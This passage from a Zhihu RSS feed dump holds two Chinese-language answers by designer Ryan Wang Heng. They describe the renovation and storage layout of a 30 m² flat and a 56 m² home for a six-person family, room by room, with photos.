11:22:54","description":"\n<p></p>\n<p>所谓小户型其实是一个模糊的概念，它的面积标准通常也是不同的：北京30至50平方米；上海60至70平方米；福州60平方米左右；武汉50至60平方米，广州50至60平方米；境外例如日本的东京、香港的中环，面积多在40平方米左右。时至今日，小户型丰富多样，功能完善，很多小户型在提高其使用率、性价比高、居住舒适度，健康住宅的标准在一定程度上也得到提高。</p>\n<p>简洁舒适、经济实用是现代都市年轻人对私人生活空间的理解，这中间包括了经济薄弱、家庭成员简单、日常很多活动在公共空间完成等等诸多缘由，因而对空间功能要求可以不那么齐全。某种意义上说，小户型只要设计合理，面积缩小但功能不减，仍然可以烘托出高质量的生活氛围。</p>\n<p><br></p>\n<p><b>下面就给大家分享一个30平米的改造的小户型，如何巧用收纳。</b></p>\n<p><br></p>\n<p><b>原始户型痛点：</b></p>\n<p>①客厅空间局促，吃饭只是放一张小小的餐桌就转不开身，更别提请朋友来家里聚会；</p>\n<p>②收纳空间不足，整屋陈设杂乱；</p>\n<p>③卫生间只要一洗澡，水就溅得地面到处都是，有安全隐患；</p>\n<p>④原来的阳台是开放式阳台，每到冬季室内都觉得潮湿阴冷。</p>\n<p><br></p>\n<p>下抛2张原始户型改造之前的<b>客厅和洗手间。</b>应该是典型的老破小户型了。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-7dbe5bb3b09f6a3b2c31ae80cf2513c3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1439\" data-watermark=\"watermark\" data-original-src=\"v2-7dbe5bb3b09f6a3b2c31ae80cf2513c3\" data-watermark-src=\"v2-d3d13de30288364de6dd65d4a1318138\" data-private-watermark-src=\"v2-ec67c49680de0a955e2192419894996f\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-018c92b8d1afe8a0df194cd353093db0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1077\" data-rawheight=\"1437\" data-watermark=\"watermark\" data-original-src=\"v2-018c92b8d1afe8a0df194cd353093db0\" data-watermark-src=\"v2-a1f4fc6e376ae303d148ca96c76afdcb\" data-private-watermark-src=\"v2-b49fefcc03ea84ebd0af411f1dc78fac\"></p>\n<p><br></p>\n<p><b>改造亮点：</b></p>\n<p>①拆改墙体，不破不立，1室1厅改2室1厅；</p>\n<p>②客厅一室两用，沙发当床，秒变卧室；</p>\n<p>③扩大厨房空间，保障操作需求；</p>\n<p>④利用沙发旁侧空位，挤出次卧空间；</p>\n<p>⑤增设大量收纳空间，归置家里零碎物品；</p>\n<p>⑥卫生间实现干湿分离，美观实用；</p>\n<p>⑦全屋铺设地暖，告别冬季阴冷潮湿；</p>\n<p>⑧开放式阳台改为封闭式，保温效果大大提升。</p>\n<p><br></p>\n<p><b>客厅  </b>（一室变两室）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2edf9476e7eada9363d273adf08c5807_720w.jpg?rss\" data-caption=\"设计将一室变为两用 ，客厅沙发电视的日常家居生活休闲区\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-2edf9476e7eada9363d273adf08c5807\" data-watermark-src=\"v2-b94c7616a6fa750f62e0b86cc048c50b\" data-private-watermark-src=\"v2-97b5b7ad45adddd7ba591d4b6041137a\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-afb4f5763f62a3f6bb2bcabface9efcf_720w.jpg?rss\" data-caption=\"客厅的的沙发是L型沙发，次卧的床正好连接了客厅的沙发，使其“L”巧变 “U&amp;quot;型。 增加了招待亲朋好友的聚会座位空间。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-afb4f5763f62a3f6bb2bcabface9efcf\" data-watermark-src=\"v2-1068b06e49d019ba1b7a86d5e9d717c3\" data-private-watermark-src=\"v2-b43b03de13f69efd86f65bc85d2e5927\"></p>\n<p><br></p>\n<p><b>次 卧</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-b468e15fbd240f87d79db170df9e5789_720w.jpg?rss\" data-caption=\" 另一侧靠窗的位置增加了次卧 ，床头贴心的安装了储物柜，可以放置换季的被褥。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"watermark\" data-original-src=\"v2-b468e15fbd240f87d79db170df9e5789\" data-watermark-src=\"v2-68f18878a8b605aaadd17ca9baf05b01\" data-private-watermark-src=\"v2-8f86b070cbe6a91d790b99f4f26e97a0\"></p>\n<p><br></p>\n<p><b>厨 房 </b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-22bc4737e614dacd4b975ce9a7e1135c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"776\" data-watermark=\"watermark\" data-original-src=\"v2-22bc4737e614dacd4b975ce9a7e1135c\" data-watermark-src=\"v2-d460b0b81881e898804f20ae458c2c53\" data-private-watermark-src=\"v2-21d6631e4e870ca7b4b5aca95c8c5d93\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-e83fcd200950475f123a2a27305a9b4f_720w.jpg?rss\" data-caption=\"厨房增加了上、下的储物柜。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1595\" data-watermark=\"watermark\" data-original-src=\"v2-e83fcd200950475f123a2a27305a9b4f\" data-watermark-src=\"v2-e74d29efc7be736276da535d12a8d6ed\" data-private-watermark-src=\"v2-a184ff687cb291201e708f7318b33d93\"></p>\n<p><br></p>\n<p><b>主 卧</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-550cf7719e2e743da7722ec078cb07e3_720w.jpg?rss\" data-caption=\"客厅另一侧是主卧，中间用储物柜做了隔离，既保障了透光又满足了储物的需求。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"674\" data-watermark=\"watermark\" data-original-src=\"v2-550cf7719e2e743da7722ec078cb07e3\" data-watermark-src=\"v2-3245ad5ff7e7c2506e6f6c94a4a25388\" data-private-watermark-src=\"v2-fa33de303438b41c76663dafd9f1042c\"></p>\n<p><br></p>\n<p><b>阳 台</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-bf11f03e54b196d188162f57b9a5c9bc_720w.jpg?rss\" data-caption=\"主卧的阳台放置了洗手台和洗衣机，方便晾晒衣物。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"765\" data-watermark=\"watermark\" data-original-src=\"v2-bf11f03e54b196d188162f57b9a5c9bc\" data-watermark-src=\"v2-7724166df27847b847cc54a2793e377c\" data-private-watermark-src=\"v2-c15c4bb3e44b7b81c727aa775974028e\"></p>\n<p><br></p>\n<p><b>书桌台</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-e62d14e8207a3ec6ce4cad616b5d866f_720w.jpg?rss\" data-caption=\"阳台另一角做了 书桌台 ，另一层做了大面积的储物柜，方便衣物和杂物的储藏空间。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"779\" data-watermark=\"watermark\" data-original-src=\"v2-e62d14e8207a3ec6ce4cad616b5d866f\" data-watermark-src=\"v2-d608f38088a2098cf77023d50023a362\" data-private-watermark-src=\"v2-1d20e0cf1ab01810acd41900365f8c43\"></p>\n<p><br></p>\n<p><b>洗手间</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c9919f2119e2cff3a6ae210d733d243e_720w.jpg?rss\" data-caption=\"干湿分离的洗手间看起来更整洁\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1619\" data-watermark=\"watermark\" data-original-src=\"v2-c9919f2119e2cff3a6ae210d733d243e\" data-watermark-src=\"v2-e67b9b92762300dd72790ca12a4742a7\" data-private-watermark-src=\"v2-fb030b775cf828d69a49ea82ca61d11b\"></p>\n<p><br></p>\n<p><b>原始户型  VS  改造后布局</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-965db9f6c5374ff7e38bc49dca3799d2_720w.jpg?rss\" data-caption=\"原始户型  VS  改造后布局\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"605\" data-watermark=\"watermark\" data-original-src=\"v2-965db9f6c5374ff7e38bc49dca3799d2\" data-watermark-src=\"v2-3240cb24da471d2b237e614538cf0b50\" data-private-watermark-src=\"v2-e0eaf21235ce887bd7607e837279d78e\"></p>\n<p><br></p>\n<p>最后再放两张对比图， 来感受一下前后不同的气质吧 ！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-003a9a03776bd6b006fe88eeddc85678_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2217\" data-watermark=\"watermark\" data-original-src=\"v2-003a9a03776bd6b006fe88eeddc85678\" data-watermark-src=\"v2-9823f301a3b8e5d4c7c0dc7467351234\" data-private-watermark-src=\"v2-5549d98302e6591dfa1291139c09af19\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-8922062fd4ff6487d4c95d597501d5cf_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2179\" data-rawheight=\"1619\" data-watermark=\"watermark\" data-original-src=\"v2-8922062fd4ff6487d4c95d597501d5cf\" data-watermark-src=\"v2-60c3f6baa485146ee854ab4b1dc8d1e8\" data-private-watermark-src=\"v2-08049ea9807beb24b990ac87d80b8bb2\"></p>\n<p><br></p>\n<p>这间面积“迷你”的房屋整体翻新，让这座充满时光印记的老房子焕发新生，驻足其间，清风拂面，我想，这才是家该有的模样。</p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ryan-wang-heng?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">设计师Ryan王恒</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/446526971/answer/2072180951?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">110 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/420620884?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">小户型如何设计增大储物收纳空间？</a><br><a href=\"http://www.zhihu.com/question/485239879?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">60平小户型，如何设计才能拥有更多的收纳空间？</a><br>\n","link":"http://www.zhihu.com/question/446526971/answer/2072180951?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"极致收纳的家是什么样的？","date":"2021-09-09 11:22:40","description":"\n<p><b>家不需要很大。</b></p>\n<p>有限的空间里，只要能够载满所需的温情，所依赖的功能，能够熟悉，能够独处，也能够互动，能够包容，能够依据时间的变化，人的变化，联动空间的自然变化，就已经很好，已经足够。</p>\n<p>这样的家是温暖的，充满未来延展的，哪怕它很小。</p>\n<p><br></p>\n<p><b>项目概况</b></p>\n<p>住宅类型：私宅</p>\n<p>家庭成员：6人</p>\n<p>套内面积：56M²</p>\n<p>空间格局：三室一厅</p>\n<p><br></p>\n<p><b>客户需求</b></p>\n<p><br></p>\n<p>该住宅常住夫妻二人与两个活泼可爱的女儿，由于工作繁忙，双方老人会交替过来帮助照顾孩子，由于空间格局与居住需求不符，因此，男女主人希望改造后：</p>\n<p><br></p>\n<p>一、     需要三个独立的休息空间；</p>\n<p>二、     拥有充足的储物空间；</p>\n<p>三、     独立办公以及尽可能开敞的位置；</p>\n<p>四、     分离式的洗手间。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-567c94cd3a0be892b77af823ea0b4ac1_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"661\" data-watermark=\"watermark\" data-original-src=\"v2-567c94cd3a0be892b77af823ea0b4ac1\" data-watermark-src=\"v2-e7d61f3e079d4f43fd15fe328f3703d3\" data-private-watermark-src=\"v2-db0b4e223fff45618ba839edf1824401\"></p>\n<p><b>原始平面图</b></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-6de3113e072ae53316f1966978f16c53_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"668\" data-watermark=\"watermark\" data-original-src=\"v2-6de3113e072ae53316f1966978f16c53\" data-watermark-src=\"v2-082ceebb6c0b1bfb46db493686f85e01\" data-private-watermark-src=\"v2-cc1d95371b331be8ea6e0d626484a0ac\"></p>\n<p><b>平面布局图</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-33dcec97d072a0d60b28ee6a52cd734b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"668\" data-watermark=\"watermark\" data-original-src=\"v2-33dcec97d072a0d60b28ee6a52cd734b\" data-watermark-src=\"v2-2d27006cde31988ff18e6c60fa11b71f\" data-private-watermark-src=\"v2-1e1b56cf7d91071c2b7a6e3eae4da944\"></p>\n<p><b>未来空间可变性示意图</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-8031ac6f23b55d9544cd21b2b6e8195e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"769\" data-watermark=\"watermark\" data-original-src=\"v2-8031ac6f23b55d9544cd21b2b6e8195e\" data-watermark-src=\"v2-4aff9667af7aab792b8124265cb98c8f\" data-private-watermark-src=\"v2-4864607e58c7e91da0f79aa76c204a87\"></p>\n<p><b>收纳面积占地示意图</b></p>\n<p><br></p>\n<p><b>入户：</b></p>\n<p><br></p>\n<p>常说<b>“麻雀虽小，五脏俱全”</b>一个合格的小户型也应该是这样，从入户的时候开始，鞋柜便已满足当季常用鞋子的收纳，方便随时换取，而开放格功能则更好的照顾到随手放置的物品。<br></p>\n<p>开放格下方的小抽屉，可以将钥匙、水电卡、身份证等随时可用的物品进行收纳管理，更及时，也更不易丢失。</p>\n<p><br></p>\n<p>入户开始，收纳便一一各安其位，而业主作息线与收纳线合二为一的设计，将贯穿整个空间。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-b516357377e6b46b4023dc0a50c424f8_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"480\" data-rawheight=\"718\" data-watermark=\"watermark\" data-original-src=\"v2-b516357377e6b46b4023dc0a50c424f8\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><b>家政间：</b></p>\n<p><br></p>\n<p>空间的拥挤极大的提升了空间内每一平方的应用率，家政间通过土间分割而来，烘干机与洗衣机并列排放，达成<b>“综合功能区”</b>的作用，更大的鞋柜用以存放平时穿不到或不合季节的鞋子，衣柜上下方的收纳，最大程度化应用了每一分寸的空间，将<b>“收纳”</b>发挥到极致。</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-a8c55e3848324539bfe94057ff760213_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"480\" data-rawheight=\"853\" data-watermark=\"watermark\" data-original-src=\"v2-a8c55e3848324539bfe94057ff760213\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-0e2561f8171cd7fc2a00c9f36a707aab_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"watermark\" data-original-src=\"v2-0e2561f8171cd7fc2a00c9f36a707aab\" data-watermark-src=\"v2-077249d524fbf05f90c14d1d31c51c3b\" data-private-watermark-src=\"v2-988458c5eca705d4f91c83afac22909f\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-927c870d3607cbaeb48cf2a773d87f39_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1621\" data-watermark=\"watermark\" data-original-src=\"v2-927c870d3607cbaeb48cf2a773d87f39\" data-watermark-src=\"v2-7ce14feb4df7d9aef6b0035bbbf1355e\" data-private-watermark-src=\"v2-aeb4a81647c7988eb9a6928937e8a08a\"></p>\n<p><br></p>\n<p><b>客厅：</b></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-9f051f4c429df39e7a87a174741e30bf_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1080\" data-watermark=\"watermark\" data-original-src=\"v2-9f051f4c429df39e7a87a174741e30bf\" data-watermark-src=\"v2-053e75ac834d8ceeef92295f92cf4fc7\" data-private-watermark-src=\"v2-3c4bd6795b7aaebfb0e2d2bf22a8d24d\"></p>\n<p><b>原始客厅</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-5c64243e1558d05915dae30fac02f287_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"490\" data-watermark=\"watermark\" data-original-src=\"v2-5c64243e1558d05915dae30fac02f287\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-0c1c08e14040fdf929c71d2ee5dbb716_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"watermark\" data-original-src=\"v2-0c1c08e14040fdf929c71d2ee5dbb716\" data-watermark-src=\"v2-4d15bb5f12facfd751c09e5339a96977\" data-private-watermark-src=\"v2-df5e3bd044c3b8af69520afb9ba7c97d\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-d651dcb84f411ef0a64001bed38b62c8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"watermark\" data-original-src=\"v2-d651dcb84f411ef0a64001bed38b62c8\" data-watermark-src=\"v2-7395ddb230f95e364137dbba34e49d4f\" data-private-watermark-src=\"v2-08c1794af21a6ccf3b3de7ff07d738a0\"></p>\n<p><b>改造后客厅</b></p>\n<p><br></p>\n<p>改造前的整体格局拥挤狭小，老人、孩子、家人的东西全部摆放在一起，杂乱无章，恒田设计师Ryan王恒将客厅空间再度细化，将两室一厅通过玻璃门与窗帘的形式切割为三室一厅，其中便包括主卧部分。</p>\n<p><b>使其对应功能更为精准，收纳更加清晰，同时，玻璃门与窗帘分别对应采光需求与隐私保障，既照顾到空间的需求，更考虑人的感受。</b></p>\n<p>当然，这样设计还考虑到未来人的变动，当老人不再同住时，老人的卧室便可作为主卧存在，而客厅只需将玻璃门与窗帘打开，原主卧稍作整理，便可以释放出更大的供一家四口活动的客厅空间，既方便随时的调整，又照顾未来的变迁。</p>\n<p>人多面积小的情况下，收纳应是无处不在，但难题在于，收纳的位置不能过于明显，在客厅的位置，特别定制的沙发卡座设计便较为隐秘的解决了这一需求，它释放出更大的空间，用来存放手头零散的小物件，避免狭小空间内来回走动的繁琐。</p>\n<p>沙发上侧，利用沙发靠背顶边及墙面空余空间，竖立一座书架，当主人与孩子坐在沙发上休憩玩耍时，伸出手臂，便可以取到一本寓教于乐的书籍讲给孩子听，沙发外空敞区域不设置茶几，众所周知，茶几棱角鲜明，材质多为玻璃、石材，并占用一定的空间。</p>\n<p>它的设计像书架、单人沙发、钢琴一样，六口之家，最浓最炽热的爱一般通通聚集在孩子身上，或是为互动，或是为学习，或是为安全。</p>\n<p><br></p>\n<p><b>这对于一个温暖的小家来说，这样的空间，留给孩子，留给未来，有些留白，难道不更好？</b></p>\n<p><br></p>\n<p><b>餐厅：</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-a63881a332e96785b033318e24cf3764_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"watermark\" data-original-src=\"v2-a63881a332e96785b033318e24cf3764\" data-watermark-src=\"v2-a04b1e7ca197c4291b3e9056be1df9cd\" data-private-watermark-src=\"v2-5bb42c6864f5c7be4addcbbbdf76a361\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-e000c77db0b4f3369ad8aaf9baac6e8f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1083\" data-watermark=\"watermark\" data-original-src=\"v2-e000c77db0b4f3369ad8aaf9baac6e8f\" data-watermark-src=\"v2-23bf62292ee36126b6a57d2adc01088d\" data-private-watermark-src=\"v2-7294967009681e03a2f9d98395bab01c\"></p>\n<p><br></p>\n<p>餐厅整体的设计，简约而惬意，长方形的形状更利于多人同时就餐，餐厅一旁开放的柜体，既可以充当西厨水吧，给生活另一种打开的姿势，又兼具餐边柜的作用，无论是放置微波炉等常用电器，还是水杯，茶壶等，都有相得益彰的妙处。</p>\n<p>柜体一旁设有单独水槽，常言<b>：“饭前便后要洗手”，</b>这样的设计使主人一家共进餐之前免去到卫生间及厨房才能洗手的现状，更利于家长<b>“现身说法”</b>，通过<b>“言传身教”，</b>从小培养孩子健康的生活习惯。</p>\n<p><br></p>\n<p><b>厨房：</b><br></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-742aafff410b9de7200288a35212d3b7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"watermark\" data-original-src=\"v2-742aafff410b9de7200288a35212d3b7\" data-watermark-src=\"v2-7839f855aed6d2f9c979135663f07db5\" data-private-watermark-src=\"v2-641cb3620400fb91e67fc0e0dc91c018\"></p>\n<p><b>原始厨房</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-011f583e6cbd41e03fc518093dc1b8a5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"watermark\" data-original-src=\"v2-011f583e6cbd41e03fc518093dc1b8a5\" data-watermark-src=\"v2-906f5b5b08f201a7c28407c0a7dc7618\" data-private-watermark-src=\"v2-62ab2d65d5d293399554ba4154fb61eb\"></p>\n<p><b>改造后厨房</b></p>\n<p><br></p>\n<p>做饭对于常人而言，是一件充满“炊烟”的事情，炊烟里藏着温度，也藏着压抑。</p>\n<p>改造前的厨房更是如此 —— 物品摆放杂乱，空间狭小，光线昏暗，一体的橱柜，改造后，设计师以独到专业的设计，展现了一个完美的厨房空间。</p>\n<p>设计师Ryan王恒考虑到业主家中老人居住的情况，在保留封闭式厨房更易中式烹饪的同时，打开墙面的开窗，既保障厨房内的油烟不会过度溢出，又使开放空间与闭塞的厨房产生互动，使做饭时的温度与压抑，得到一定的解放。</p>\n<p><b>同时它还利于做饭的父母在厨房空间内便可随时观察到客厅玩耍的孩子，在自己的视线可控范围内，保护孩子的安全。</b></p>\n<p>在这个基础之上，又因空间有限的客观因素，为保证空间使用的流畅与舒适，将冰箱、干货柜等可以储存食材的功能归置于餐厅，将常用的厨具通过五金挂件妥帖存置，让厨房本身像一个<b>“永动机”</b>一样，在<b>洗，切，炒，</b>的动线中，保持良性循环。</p>\n<p><br></p>\n<p><b>主卧：</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-d9dc8727c03c9fb4ab76f4838456c754_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"watermark\" data-original-src=\"v2-d9dc8727c03c9fb4ab76f4838456c754\" data-watermark-src=\"v2-69892d55c4ab3d1f53b4fad108456a5f\" data-private-watermark-src=\"v2-3105955e58156abd10c4631bb85a81dd\"></p>\n<p><b>原始卧室</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d14f815f50e03453b238124147ea2d6d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"watermark\" data-original-src=\"v2-d14f815f50e03453b238124147ea2d6d\" data-watermark-src=\"v2-e097843875b1b97011daeef5aa43f159\" data-private-watermark-src=\"v2-cb09fc0385e50c3d8a4d4c164171500e\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-05fddad50a0aba5fe4e88a109d068d8b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"watermark\" data-original-src=\"v2-05fddad50a0aba5fe4e88a109d068d8b\" data-watermark-src=\"v2-35ee54802944b112f26a5268462b7d28\" data-private-watermark-src=\"v2-1b6bdb04e5fc5561003afc7f5fc1b705\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-36dad57bb4cba854b6f121407a689584_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"watermark\" data-original-src=\"v2-36dad57bb4cba854b6f121407a689584\" data-watermark-src=\"v2-77d8ddfa2afa7345ec5e0beb7ea5691f\" data-private-watermark-src=\"v2-ea9ac88fdebbaf8e53b33fa803b15032\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-2cd19597538c523db0db7ee2740ff1b3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"watermark\" data-original-src=\"v2-2cd19597538c523db0db7ee2740ff1b3\" data-watermark-src=\"v2-eeca81f9f228f4933ec7eb3c28782848\" data-private-watermark-src=\"v2-928c8b6985023f55eb6abfaf2933798d\"></p>\n<p><b>改造后卧室</b></p>\n<p><br></p>\n<p>对于卧室而言，功能性和舒适度永远都是首要的，而在有限的，开放的空间内，保证卧室的采光、隐私，更是极为重要。</p>\n<p>在米白色的公共区域分割出的卧室内，通过地面整体抬高榻榻米的设计，释放更大的地面空间，使其代替传统双人床，并在释放出的空间增加如“月光宝盒”般的收纳储物功能。</p>\n<p>同上述客厅沙发收纳，衣柜的同色设计使其关上门，乍看空无一物，最大程度的在视觉上，使人感觉卧室的整体空间被增大。</p>\n<p>在衣柜内，更根据长衣、短袖、私人衣物、冬夏衣物、被褥等不同分类通过层板等设计进行归置，这样即使再拥挤的空间，也不会让生活的动线紊乱。</p>\n<p>而卧室内侧通过窗帘切割的阳台，放置了办公与阅读所需的书架，阳台书桌方便放置笔记本等办公用具，窗外正临街景，在有限的条件内，给人以极大的便利与享受。</p>\n<p><br></p>\n<p><b>儿童房：</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-51eb962d00b35a4d8b2764e1417fb69c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"watermark\" data-original-src=\"v2-51eb962d00b35a4d8b2764e1417fb69c\" data-watermark-src=\"v2-7ff5c677396b10ea5f4aee330f3b68c9\" data-private-watermark-src=\"v2-034e8cd781bcdc314d03102349999ae7\"></p>\n<p><b>原始儿童房</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-34b7693eee7b180984b744d9d0db9f80_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"watermark\" data-original-src=\"v2-34b7693eee7b180984b744d9d0db9f80\" data-watermark-src=\"v2-d02a203e3d98def3f39c320a662474cd\" data-private-watermark-src=\"v2-62e2372c8a27ff43df32ac6447f3af19\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-9cdb96c548b35d9ca866fa26a598b6a4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"watermark\" data-original-src=\"v2-9cdb96c548b35d9ca866fa26a598b6a4\" data-watermark-src=\"v2-488761fc17cd315a708a9191110f0573\" data-private-watermark-src=\"v2-a475264471e1a541afef10df2f14ed2e\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-0e8ee396c2368d9a11d8423676d6db63_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"watermark\" data-original-src=\"v2-0e8ee396c2368d9a11d8423676d6db63\" data-watermark-src=\"v2-ac46b6b60fb64890b14566a537384160\" data-private-watermark-src=\"v2-896010af8234978c18394c239e916557\"></p>\n<p><b>改造后儿童房</b></p>\n<p><br></p>\n<p>儿童房的使命不言而喻</p>\n<p>即陪伴孩子们度过自己的童年时光</p>\n<p>考虑到两个孩子的居住需求，儿童房采用上下床释放出更多的空间留给孩子活动，独立立柜分上下两层，灯饰同样如此，这方便孩子们住在上层也可以轻松关掉。</p>\n<p><br></p>\n<p><b>窗台边通长的书桌是孩子们的学习空间，两个孩子同时学习，并不会显得拥挤，两侧的书柜分别对应孩子们不同的阅读需求，遏制书籍混淆的情况发生。</b></p>\n<p>在整体的颜色上，它以米色、原木色为主，自然光的光泽度洒落在空间中，飘散着具温度的质感，轻抚流动于室内，使人一目了然，空间感、使用感、舒适度配搭得宜，孩子生活在这样的环境中，相信父母才会更加放心。</p>\n<p><br></p>\n<p><b>卫生间：</b></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-695f63254ff09dd414b311489367a92d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"watermark\" data-original-src=\"v2-695f63254ff09dd414b311489367a92d\" data-watermark-src=\"v2-613b330ded741f78f065671af7541ab3\" data-private-watermark-src=\"v2-d9a68f98dc95e00b9a9f497d8ca20ea5\"></p>\n<p>原始卫生间</p>\n<p><br></p>\n<p><img 